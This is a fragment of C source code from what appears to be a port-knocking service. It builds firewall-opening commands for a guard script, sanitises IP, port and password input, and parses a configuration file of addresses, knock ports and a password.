        sprintf(str,"/usr/bin/guard.sh eth0 %s %d %d tcp udp",
                       ip, knock.port, knock.time.dur);
        //system(str);
        bzero(command,80);
        strcpy(command,str);
        pthread_create (&thread0, NULL, commander1, NULL);
        pthread_detach (thread0);
    }
    else if(ports.tcp){
        bzero(str, 200);
        sprintf(str,"/usr/bin/guard.sh eth0 %s %d %d tcp",
                       ip, knock.port, knock.time.dur);
        //system(str);
        bzero(command,80);
        strcpy(command,str);
        pthread_create (&thread0, NULL, commander1, NULL);
        pthread_detach (thread0);
    }
    else if(ports.udp){
        bzero(str, 200);
        sprintf(str,"/usr/bin/guard.sh eth0 %s %d %d udp",
                       ip, knock.port, knock.time.dur);
        //system(str);
        bzero(command,80);
        strcpy(command,str);
        pthread_create (&thread0, NULL, commander1, NULL);
        pthread_detach (thread0);
    }
    //pthread_mutex_unlock(&mutex);
    pthread_exit(NULL);
    return NULL;
}

// see if the string is digits
unsigned char isDigit(char *str, int len)
{
    int i;
    int p;
    
    for(i=0;i<len;i++)
    {
        p = *(str+i);
        if(!isdigit(p)) return 0;
    }
    return 1;
}

// delete all dirty characters
void purifyIP(char *buf)
{
    int i;

    for(i = 15; i >= 0; i--){
        if(!isdigit(buf[i]) && buf[i] != '.') buf[i] = 0;
    }
}
// delete all dirty characters
void purifyPort(char *buf)
{
    int i;

    for(i = 15; i >= 0; i--){
        if(!isdigit(buf[i])) buf[i] = 0;
    }
}
// delete all dirty characters
void purifyPassword(char *buf)
{
    int i;

    for(i = 15; i >= 0; i--){
        if(!isprint(buf[i])) buf[i] = 0;
    }
}
/****************************************************************************
Function    :  config (thread function)
REVISIONS   :  
Inteface    :  void config(void)
Description :  This function is used to read config file
****************************************************************************/
void config(void)
{
    FILE *file;
    unsigned long FileLength;
    char str[22], txt[16];
    
    file = fopen(CONFIGFILE,"r");
    if(file==NULL){
        perror("Error: config() : fopen() : ");
        exit(-1);
    }
    if(fseek(file,0,SEEK_END)==-1)
    {
        perror("Error: config() : fseek() : ");
        exit(-1);
    }
    FileLength = ftell(file);
    if(FileLength == 0 || FileLength == -1){
        perror("Error: config() : ftell() : ");
        exit(-1);
    }
    rewind(file);
    while(ftell(file) < FileLength){
        bzero(str,22);
        bzero(txt,16);
        fgets(str,22,file);
        
        if(str[0] == '#') continue;     // Skip all comments
        
        if(!strncmp("src = ", str, 6)){    // Source IP address
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyIP(txt);
            bzero(sip,16);
            strncpy(sip, txt, strlen(txt));
            continue;
        }
        
        if(!strncmp("dst = ", str, 6)){   // Destination IP address
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyIP(txt);
            bzero(dip,16);
            strncpy(dip, txt, strlen(txt));
            continue;
        }
        
        if(!strncmp("spt = ", str, 6)){   // Source udp port for sending commands
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPort(txt);
            SOURCE_PORT = (short)atoi(txt);
            continue;
        }
        
        if(!strncmp("dpt = ", str, 6)){   // Destination udp port for sending commands
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPort(txt);
            DEST_PORT = (short)atoi(txt);
            continue;
        }
        
        if(!strncmp("spk = ", str, 6)){   // source port number used for knocking
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPort(txt);
            SPORT_KNOCK = (short)atoi(txt);
            continue;
        }
        
        if(!strncmp("dpk = ", str, 6)){   // Destination port number used for knocking
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPort(txt);
            DPORT_KNOCK = (short)atoi(txt);
            continue;
        }
        
        if(!strncmp("sap = ", str, 6)){   // Destination port number used for knocking
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPort(txt);
            P_AUTH = (short)atoi(txt);
            continue;
        }
        
        if(!strncmp("dap = ", str, 6)){   // Destination port number used for knocking
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPort(txt);
            D_AUTH = (short)atoi(txt);
            continue;
        }
        
        if(!strncmp("pwd = ", str, 6)){   // Knocking password
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPassword(txt);
            bzero(pass,9);
            strncpy(pass, txt, 8);
            continue;
        }
    }
    
    bzero(filter, 80);
    sprintf(filter, "udp and dst port %d and src port %d", DEST_PORT, SOURCE_PORT);
    
    if(fclose(file)){
        perror("Error: config() : fclose() : ");
        exit(-1);
    }
}